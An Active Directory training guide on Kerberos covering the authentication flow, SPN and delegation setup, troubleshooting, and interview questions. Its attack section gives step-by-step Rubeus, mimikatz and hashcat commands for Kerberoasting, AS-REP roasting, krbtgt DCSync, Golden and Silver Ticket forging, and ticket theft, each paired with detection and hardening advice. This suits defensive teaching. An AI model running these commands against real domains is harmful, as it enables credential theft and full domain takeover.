# 01 — Kerberos

> **Section:** 03 — AD Authentication Protocols  
> **Difficulty:** Intermediate  
> **Ports:** 88 (TCP/UDP)

---

## 📌 What is Kerberos?

Kerberos is the **primary authentication protocol** used by Active Directory. Every time a user logs into a Windows domain machine, accesses a file share, connects to a SQL Server, or uses any domain service — Kerberos is doing the authentication behind the scenes.

> **Simple definition:**  
> Kerberos is a ticket-based authentication system. Instead of sending your password over the network every time you access something, you get a ticket after your first login — and use that ticket to prove your identity everywhere else.

### Real-World Analogy

Think of a **theme park wristband**:

- You arrive at the park → show your ID + buy a ticket → get a wristband
- For the rest of the day → just show your wristband to enter any ride
- You never show your ID again — the wristband proves you already paid
- The wristband expires at park closing time

In Kerberos:
- Your **ID** = username + password
- The **ticket office** = KDC (Key Distribution Centre on the DC)
- Your **wristband** = TGT (Ticket Granting Ticket)
- Each **ride** = a service (file server, printer, SQL)
- Each **ride ticket** = Service Ticket

---

## ⚙️ How Kerberos Works — Step by Step

### The Characters

```
Hareesh    = the user who wants to access resources
DC01       = Domain Controller running the KDC
KDC        = Key Distribution Centre (AS + TGS combined)
AS         = Authentication Service (issues TGTs)
TGS        = Ticket Granting Service (issues Service Tickets)
FileServer = the resource Hareesh wants to access
KRBTGT     = special KDC account whose key signs all TGTs
```

### Full Authentication Flow

```
PHASE 1 — Getting the TGT (happens at login)
─────────────────────────────────────────────

Step 1: Hareesh types his password at login
        Windows creates an AS-REQ:
        {
          username: "hareesh",
          timestamp: encrypted with Hareesh's password hash,
          requested service: krbtgt/company.local
        }
        Sent to DC01 on port 88

Step 2: DC01 (AS) receives the request
        Looks up Hareesh's password hash in AD
        Decrypts the timestamp → verifies it
        Checks: is timestamp within 5 minutes? (clock skew check)
        
        If valid → creates TGT:
        {
          client: hareesh,
          valid from: now,
          expires: now + 10 hours,
          session key: [random key for Hareesh to use with TGS]
        }
        TGT encrypted with KRBTGT account's key
        (Hareesh CANNOT read this — only the KDC can)
        
        Sends back AS-REP:
        → Part 1: TGT (encrypted with KRBTGT key) ← Hareesh stores this
        → Part 2: Session key (encrypted with Hareesh's key) ← Hareesh decrypts this

Step 3: Hareesh now has his TGT stored in memory (LSASS)
        His password is NOT needed again for 10 hours

─────────────────────────────────────────────────────────
PHASE 2 — Getting a Service Ticket (happens when accessing a resource)
─────────────────────────────────────────────────────────

Step 4: Hareesh opens \\FileServer01\Finance
        Windows creates a TGS-REQ:
        {
          TGT: [the TGT from Step 2],
          authenticator: {hareesh, timestamp} encrypted with session key,
          requested service: cifs/FileServer01.company.local
        }
        Sent to DC01 on port 88

Step 5: DC01 (TGS) receives the TGS-REQ
        Decrypts TGT with KRBTGT key → reads session key
        Uses session key to decrypt authenticator → verifies identity
        
        Creates Service Ticket for FileServer01:
        {
          client: hareesh,
          valid: 10 hours,
          session key 2: [new key for Hareesh to use with FileServer01]
        }
        Service Ticket encrypted with FileServer01's account key
        (Only FileServer01 can decrypt this)

Step 6: DC01 sends back TGS-REP:
        → Service Ticket (encrypted with FileServer01's key)
        → Session Key 2 (encrypted with Hareesh's session key)

Step 7: Hareesh sends AP-REQ to FileServer01:
        → Service Ticket
        → Authenticator: {hareesh, timestamp} encrypted with Session Key 2

Step 8: FileServer01 decrypts Service Ticket with its own key
        Gets Session Key 2 → decrypts authenticator → verifies Hareesh
        Access granted ✅

Key point: Hareesh's password NEVER crossed the network after Step 1
           FileServer01 NEVER contacted the DC — it trusted the ticket
           This is why Kerberos is efficient and secure
```

### SPN — Service Principal Name

For Kerberos to work, every service must have an **SPN** — a unique identifier that maps a service to its account.

```
Format: serviceclass/host:port/servicename

Examples:
  cifs/FileServer01.company.local        ← File sharing (SMB)
  http/WebServer01.company.local         ← IIS web server
  MSSQLSvc/SQLServer01.company.local:1433 ← SQL Server
  HOST/DC01.company.local               ← General host services

Why SPNs matter:
  When Hareesh accesses FileServer01:
  Windows looks up SPN: cifs/FileServer01.company.local
  Finds which account owns that SPN → FileServer01$
  Requests a service ticket encrypted with that account's key

If SPN is missing:
  Kerberos cannot create the service ticket
  Falls back to NTLM authentication (less secure)
```

```powershell
# View SPNs registered for a computer
Get-ADComputer -Identity "FileServer01" -Properties ServicePrincipalNames |
    Select-Object -ExpandProperty ServicePrincipalNames

# View SPNs for a service account
Get-ADUser -Identity "svc_sql" -Properties ServicePrincipalNames |
    Select-Object -ExpandProperty ServicePrincipalNames

# Register an SPN manually
setspn -A MSSQLSvc/SQLServer01.company.local:1433 svc_sql

# Find all accounts with SPNs (Kerberoasting targets)
Get-ADUser -Filter {ServicePrincipalNames -ne "$null"} `
    -Properties ServicePrincipalNames |
    Select-Object Name, ServicePrincipalNames
```

---

## 🔧 Real-World Kerberos Configuration

### Configuration 1 — Kerberos for IIS Web Application

```
Scenario: GP wants to configure an internal web app (IIS) to use
          Windows Authentication (Kerberos) so users auto-login
          without a username/password prompt.

Step 1: Create a service account for IIS
  New-ADUser -Name "svc_webapp" `
             -SamAccountName "svc_webapp" `
             -AccountPassword (ConvertTo-SecureString "LongR@ndom2024!" -AsPlainText -Force) `
             -Enabled $true `
             -Path "OU=Service-Accounts,DC=company,DC=local"

Step 2: Register the SPN for the web application
  setspn -A HTTP/webapp.company.local svc_webapp
  setspn -A HTTP/webapp.company.local:80 svc_webapp

Step 3: Configure IIS to run under svc_webapp
  IIS Manager → Application Pools → WebApp_Pool
  → Identity → Custom account → svc_webapp

Step 4: Configure IIS Authentication
  IIS Manager → WebApp site → Authentication
  → Disable: Anonymous Authentication
  → Enable: Windows Authentication
  → Providers: Negotiate (Kerberos first, NTLM fallback)

Step 5: Configure IE/Edge on client machines via GPO
  GPO: User Config → Admin Templates → IE → Internet Control Panel
  → Security Page → Intranet Zone → Sites
  → Add: *.company.local (enables automatic Kerberos auth)

Result:
  Hareesh opens https://webapp.company.local
  Browser automatically sends Kerberos ticket
  Hareesh is logged in without typing credentials ✅
  No username/password prompt ✅
```

### Configuration 2 — Kerberos for SQL Server

```
Scenario: SQL Server needs Kerberos for delegation
          (web app needs to pass Hareesh's identity to SQL)

Step 1: Create SQL service account
  New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" ...

Step 2: Register SQL SPNs
  setspn -A MSSQLSvc/SQLServer01.company.local svc_sql
  setspn -A MSSQLSvc/SQLServer01.company.local:1433 svc_sql
  setspn -A MSSQLSvc/SQLServer01 svc_sql

Step 3: Configure SQL Server to run as svc_sql
  SQL Server Configuration Manager
  → SQL Server Services → SQL Server (MSSQLSERVER)
  → Log On → This account → svc_sql

Step 4: Enable Kerberos Constrained Delegation
  (allows web server to pass Hareesh's identity to SQL)
  AD → svc_webapp properties → Delegation tab
  → Trust this user for delegation to specified services only
  → Add: MSSQLSvc/SQLServer01.company.local:1433

Step 5: Verify Kerberos is being used
  On SQL Server, run:
  SELECT auth_scheme FROM sys.dm_exec_connections
  WHERE session_id = @@SPID
  -- Should return: KERBEROS (not NTLM)

Verify SPNs are correct:
  setspn -L svc_sql
```

### Configuration 3 — Kerberos for Network Printer

```
Scenario: HP Enterprise printer needs Kerberos authentication
          so only domain users can print

Step 1: Create printer service account
  New-ADUser -Name "svc_printer" -SamAccountName "svc_printer" ...

Step 2: Register SPN for printer
  setspn -A HTTP/printer01.company.local svc_printer
  setspn -A HOST/printer01.company.local svc_printer

Step 3: Configure printer (HP EWS — Embedded Web Server)
  Open printer admin page: https://192.168.1.100
  → Security → Access Control → Kerberos
  → KDC: DC01.company.local
  → Realm: COMPANY.LOCAL (must be UPPERCASE)
  → Service Account: svc_printer
  → Password: [svc_printer password]

Step 4: Configure printer DNS record
  Add-DnsServerResourceRecordA -ZoneName "company.local" `
      -Name "printer01" -IPv4Address "192.168.1.100"

Step 5: Test
  Hareesh sends a print job
  Printer validates Hareesh's Kerberos ticket
  Print job processed ✅
  Unauthenticated print jobs rejected ❌
```

### Configuration 4 — Kerberos Delegation for SharePoint

```
Scenario: SharePoint accesses backend services on behalf of users
          (requires Kerberos delegation)

Step 1: Register SPNs for SharePoint
  setspn -A HTTP/sharepoint.company.local svc_sharepoint
  setspn -A HTTP/sharepoint company.local svc_sharepoint

Step 2: Configure Constrained Delegation
  GP opens ADUC → svc_sharepoint → Properties → Delegation
  → Trust this user for delegation to specified services only
  → Use Kerberos only
  → Add services SharePoint needs to access:
    → MSSQLSvc/SQLServer01.company.local:1433
    → HTTP/backend-service.company.local

Step 3: Set IIS app pool to use svc_sharepoint
Step 4: Configure SharePoint web applications for Kerberos

Verify delegation is working:
  On SharePoint server: klist tickets
  → Look for tickets for backend services ✅
```

---

## ⚠️ Kerberos Attack Techniques

### Attack 1 — Kerberoasting

**One of the most common AD attacks. Any domain user can do it.**

```
What: Request service tickets for accounts with SPNs.
      The ticket is encrypted with the service account's password hash.
      Take the ticket offline and crack the password.

Why it works:
  Any authenticated domain user can request a TGS for ANY SPN
  This is by design — Kerberos was designed for interoperability
  The TGS is encrypted with the service account's NTLM hash
  If the password is weak → it can be cracked offline

Step-by-step attack:
  Step 1: Hareesh (attacker, regular domain user) enumerates SPNs
    Get-ADUser -Filter {ServicePrincipalNames -ne "$null"} `
        -Properties ServicePrincipalNames

    Finds: svc_backup with SPN backup/server01.company.local
           Password last set: 2019. Never expires.

  Step 2: Request service ticket for svc_backup
    Add-Type -AssemblyName System.IdentityModel
    $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
        -ArgumentList "backup/server01.company.local"

    OR using Rubeus:
    Rubeus.exe kerberoast /outfile:hashes.txt

  Step 3: Extract the hash
    The service ticket contains the password hash (RC4 or AES)
    Saved as: $krb5tgs$23$*svc_backup*...

  Step 4: Crack offline with Hashcat
    hashcat -m 13100 hashes.txt rockyou.txt
    → Cracks "Backup2019!" in 4 minutes

  Step 5: Authenticate as svc_backup
    svc_backup has Domain Admin rights
    → Full domain compromise

Tools: Rubeus, Invoke-Kerberoast, Impacket GetUserSPNs.py
```

**Detection:**
```
Event ID 4769 — Kerberos Service Ticket was requested
  Watch for:
  → Encryption type: 0x17 (RC4) — modern systems use AES
  → Many 4769 events in short time from same source
  → Requests for service accounts (not computer accounts)

Sentinel/Splunk query:
  SecurityEvent
  | where EventID == 4769
  | where TicketEncryptionType == "0x17"
  | summarize count() by Account, IpAddress, bin(TimeGenerated, 1h)
  | where count_ > 10
```

**Defense:**
```
1. Use gMSA for all service accounts (240-bit password = uncrackable)
2. Set long random passwords (25+ chars) on legacy service accounts
3. Enable AES encryption only — disable RC4:
   Set-ADUser svc_backup -KerberosEncryptionType AES256
4. Monitor Event ID 4769 for RC4 encryption type
5. Run BloodHound to find Kerberoastable accounts
```

---

### Attack 2 — AS-REP Roasting

```
What: If a user account has "Do not require Kerberos preauthentication" enabled,
      the KDC returns an AS-REP without verifying the requester's identity.
      The AS-REP contains data encrypted with the user's password hash.
      Crack it offline.

Why it exists:
  Some legacy applications require pre-auth to be disabled
  Admins sometimes disable it without understanding the risk

Step-by-step attack:
  Step 1: Find accounts with pre-auth disabled
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} `
        -Properties DoesNotRequirePreAuth

    Finds: hareesh-legacy (old service account)

  Step 2: Request AS-REP without authentication
    Rubeus.exe asreproast /user:hareesh-legacy /outfile:asrep.txt
    OR: Impacket GetNPUsers.py company.local/ -usersfile users.txt

  Step 3: Crack with Hashcat
    hashcat -m 18200 asrep.txt rockyou.txt

  Step 4: Authenticate with cracked password

Tools: Rubeus, Impacket GetNPUsers.py
```

**Detection:**
```
Event ID 4768 — Kerberos TGT was requested
  Watch for:
  → Pre-authentication type: 0 (no pre-auth)
  → This should NEVER happen in a hardened environment
```

**Defense:**
```
1. Ensure ALL accounts have pre-auth enabled:
   Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} |
       Set-ADUser -DoesNotRequirePreAuth $false

2. Alert on ANY 4768 with pre-auth type 0
3. Regular audit of account properties
```

---

### Attack 3 — Golden Ticket Attack

```
What: If attacker gets the KRBTGT account's NTLM hash,
      they can forge a TGT for ANY user — including non-existent ones.
      The forged TGT is valid for 10 years by default.
      Even if all passwords are reset — Golden Ticket still works
      until KRBTGT is rotated TWICE.

Prerequisites: Domain Admin access (to get KRBTGT hash)

Step-by-step attack:
  Step 1: Attacker has Domain Admin
    Runs DCSync to get KRBTGT hash:
    mimikatz: lsadump::dcsync /user:krbtgt

    Gets:
    Hash NTLM: 8f4b2c9d3e1a7f6b... (KRBTGT hash)
    Domain SID: S-1-5-21-1234567890-...

  Step 2: Create Golden Ticket
    mimikatz:
    kerberos::golden
      /user:FakeAdmin        ← can be ANY name, even non-existent
      /domain:company.local
      /sid:S-1-5-21-1234567890-...
      /krbtgt:8f4b2c9d3e1a7f6b...
      /groups:512            ← Domain Admins group RID
      /ticket:golden.kirbi

  Step 3: Inject ticket into current session
    kerberos::ptt golden.kirbi

  Step 4: Access any resource
    dir \\DC01\C$             ← Full access to Domain Controller ✅
    psexec \\DC01 cmd.exe     ← Command shell on DC ✅

  The ticket is valid for 10 years.
  Even if Hareesh's real account is deleted → ticket still works.
  Even if all passwords reset → ticket still works.
  ONLY KRBTGT rotation (TWICE) invalidates it.
```

**Detection:**
```
Signs of Golden Ticket:
  → Account name in ticket does not exist in AD
  → Ticket lifetime > 10 hours (Golden Tickets default to 10 years)
  → Ticket not preceded by a TGT request (Event ID 4768)
  → Access to sensitive systems with no prior authentication events

Microsoft Defender for Identity detects Golden Ticket automatically.

Event IDs:
  4624 — Logon with suspicious ticket (no prior 4768)
  4672 — Admin rights used
```

**Defense:**
```
1. Rotate KRBTGT password TWICE (invalidates all existing TGTs):
   # Reset KRBTGT password (do this twice, 10 hours apart)
   Set-ADAccountPassword -Identity "krbtgt" `
       -NewPassword (ConvertTo-SecureString "NewRandom!" -AsPlainText -Force) `
       -Reset

   WARNING: This will log out all users → plan a maintenance window

2. Deploy Microsoft Defender for Identity (detects Golden Tickets)
3. Protect Domain Controllers as Tier 0
4. Monitor for accounts accessing resources without prior TGT events
5. Enable Privileged Access Workstations for all DC access
```

---

### Attack 4 — Pass-the-Ticket (PtT)

```
What: Steal a valid Kerberos ticket from memory
      and inject it into another session to impersonate the user.

Step-by-step attack:
  Step 1: Attacker compromises a machine where GP is logged in
  Step 2: Extract GP's tickets from LSASS memory:
    Rubeus.exe dump /luid:0x3e7 /service:krbtgt
    OR: mimikatz sekurlsa::tickets /export

  Step 3: Copy GP's TGT file (gp@company.local.kirbi)

  Step 4: Inject into attacker's session:
    Rubeus.exe ptt /ticket:gp@company.local.kirbi

  Step 5: Access resources as GP:
    klist  ← shows GP's tickets in session
    dir \\FileServer01\Finance  ← access as GP ✅

Tools: Rubeus, Mimikatz
```

**Defense:**
```
1. Add GP's admin account to Protected Users group:
   Add-ADGroupMember -Identity "Protected Users" -Members "gp-admin"
   
   Protected Users group prevents:
   → Credential caching on remote machines
   → NTLM authentication
   → DES or RC4 Kerberos encryption
   → Delegation of credentials

2. Enable Credential Guard (protects LSASS memory)
3. Short ticket lifetimes (reduce window of stolen ticket use)
4. Monitor for ticket injection using EDR tools
```

---

### Attack 5 — Silver Ticket Attack

```
What: Forge a service ticket using a SERVICE ACCOUNT's hash (not KRBTGT).
      More limited than Golden Ticket — only works for that specific service.
      Harder to detect because it never contacts the KDC.

Example:
  Attacker has svc_sql NTLM hash (from Kerberoasting)
  Creates forged service ticket for SQL Server:
  
  mimikatz:
  kerberos::golden
    /user:FakeAdmin
    /domain:company.local
    /sid:S-1-5-21-...
    /target:SQLServer01.company.local
    /service:MSSQLSvc
    /rc4:[svc_sql NTLM hash]
    /ticket:silver.kirbi

  kerberos::ptt silver.kirbi
  
  → Access SQL Server as FakeAdmin ✅
  → No KDC contact → harder to detect ✅

Detection:
  → No Event ID 4768/4769 on DC (ticket never went through KDC)
  → Event ID 4624 on target server with suspicious logon
  → Defender for Identity: detects forged PAC
  
Defense:
  → Enable PAC validation on services
  → Rotate service account passwords regularly
  → Use gMSA (rotating password makes silver tickets short-lived)
```

---

## 🛡️ Kerberos Hardening Checklist

- [ ] Use gMSA for ALL service accounts — eliminates Kerberoasting
- [ ] Set AES256 encryption on all accounts — disable RC4:
  ```powershell
  Get-ADUser -Filter * | Set-ADUser -KerberosEncryptionType AES256
  ```
- [ ] Enable pre-authentication on ALL accounts
- [ ] Add all admin accounts to Protected Users group
- [ ] Deploy Credential Guard on all workstations and servers
- [ ] Rotate KRBTGT password every 180 days minimum
- [ ] Deploy Microsoft Defender for Identity
- [ ] Monitor Event ID 4769 for RC4 encryption type
- [ ] Set ticket lifetime to 8 hours (default is 10)
- [ ] Enable PAC validation on all services

---

## 🔧 Troubleshooting Kerberos

### Clock Skew Error
```
Error: "The time at the Primary Domain Controller is different"
Cause: Kerberos requires clocks within 5 minutes of each other

Fix:
  # Sync time on workstation
  net time /domain /set /yes
  w32tm /resync /force

  # Check time source hierarchy
  w32tm /query /status
  w32tm /query /peers
```

### SPN Issues
```
Error: "No Kerberos credentials available" or falling back to NTLM

Diagnose:
  # Check if SPN exists
  setspn -Q HTTP/webapp.company.local

  # Check for duplicate SPNs (causes auth failures)
  setspn -X

Fix duplicate SPN:
  setspn -D HTTP/webapp.company.local wrong_account
  setspn -A HTTP/webapp.company.local correct_account
```

### Verify Kerberos is Being Used
```powershell
# Check current Kerberos tickets
klist

# Check tickets on remote machine
klist /li 0x3e7

# For SQL Server — verify Kerberos (not NTLM)
SELECT auth_scheme, net_transport
FROM sys.dm_exec_connections
WHERE session_id = @@SPID
-- Should show: KERBEROS

# Network capture — Wireshark filter
# kerberos  ← shows all Kerberos traffic on port 88
```

---

## 🎯 Interview Questions

**Q1. Explain the Kerberos authentication flow in simple terms.**  
**A:** Kerberos works in two phases. First, when a user logs in, they send their credentials to the KDC (on the DC) and receive a TGT — like a day pass proving they authenticated. Second, when the user wants to access a resource (file server, printer, SQL), they present their TGT to the KDC and receive a Service Ticket specific to that resource. They present the Service Ticket directly to the resource — which verifies it without contacting the DC. The password is only used once at login; tickets handle everything after that.

---

**Q2. What is an SPN and why is it important?**  
**A:** An SPN (Service Principal Name) is a unique identifier for a service in a domain — it maps a service (like IIS or SQL Server) to the account running it. Kerberos uses SPNs to find which account to issue a Service Ticket for. If an SPN is missing, Kerberos cannot issue the service ticket and authentication falls back to NTLM. If duplicate SPNs exist, authentication fails entirely. SPNs must be registered correctly for Kerberos to work.

---

**Q3. What is Kerberoasting and how do you defend against it?**  
**A:** Kerberoasting exploits the fact that any domain user can request a Kerberos Service Ticket for any SPN. The ticket is encrypted with the service account's password hash. An attacker requests tickets for service accounts with SPNs and cracks the hashes offline. The best defense is using gMSA (Group Managed Service Accounts) — their passwords are 240 bits and automatically rotated, making the hash computationally impossible to crack. For legacy service accounts, use passwords of 25+ characters and enforce AES encryption only (disable RC4).

---

**Q4. What is a Golden Ticket attack and why is it so dangerous?**  
**A:** A Golden Ticket is a forged Kerberos TGT created using the KRBTGT account's password hash. Since all TGTs are signed with KRBTGT, a forged one is indistinguishable from legitimate ones. It can be for any user — even non-existent ones — and is valid for up to 10 years by default. It bypasses all normal authentication controls. Even password resets do not invalidate it. Only rotating the KRBTGT password twice (10 hours apart) invalidates existing Golden Tickets. This makes post-compromise cleanup very difficult if a Golden Ticket was created.

---

**Q5. What is the difference between a Golden Ticket and a Silver Ticket?**  
**A:** A Golden Ticket is forged using the KRBTGT hash and grants access to ANY service in the domain as any user — it is the TGT that authorises everything. A Silver Ticket is forged using a SERVICE ACCOUNT's hash and only grants access to that specific service. Golden Tickets require KRBTGT compromise (very high privilege). Silver Tickets only require the service account's hash (achievable via Kerberoasting). Silver Tickets are harder to detect because they never contact the KDC — no 4768/4769 events are generated.

---

**Q6. Scenario — GP reports that users accessing the internal web application are being prompted for credentials instead of getting automatic SSO. What do you check?**  
**A:** This is a classic Kerberos SSO failure. Check in order: (1) Is the SPN registered correctly? Run setspn -Q HTTP/webapp.company.local — if missing, register it. (2) Are there duplicate SPNs? Run setspn -X — duplicates cause auth to fail. (3) Is the browser configured to send Kerberos for intranet sites? The site must be in the IE/Edge Intranet Zone. (4) Is the IIS app pool running under the service account that owns the SPN? (5) Is clock skew an issue? Check time difference between client, IIS server, and DC. (6) Capture network traffic with Wireshark — is port 88 being used? If NTLM packets appear instead, Kerberos is falling back — investigate why.

---

*"Kerberos is elegant — one authentication, tickets for everything. But every piece of that elegance can be exploited: the tickets can be stolen, the service ticket hashes cracked, and the master key forged. Know the protocol to defend it."*
